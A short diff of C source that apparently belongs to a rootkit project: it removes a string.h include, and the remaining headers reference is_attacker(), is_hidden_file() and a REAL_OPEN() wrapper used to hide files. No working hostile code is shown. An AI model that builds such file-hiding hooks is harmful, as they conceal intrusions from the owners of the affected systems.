@@ -21,7 +21,6 @@
 #include <stdarg.h> /* va_list, va_start(), va_args(), va_end() */
 #include <fcntl.h> /* O_CREAT */
 #include <sys/stat.h> /* mode_t */
-#include <string.h> /* strstr() */
 #include <errno.h> /* errno, ENOENT */
 #include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file() */
 #include "config.h" /* REAL_OPEN() */
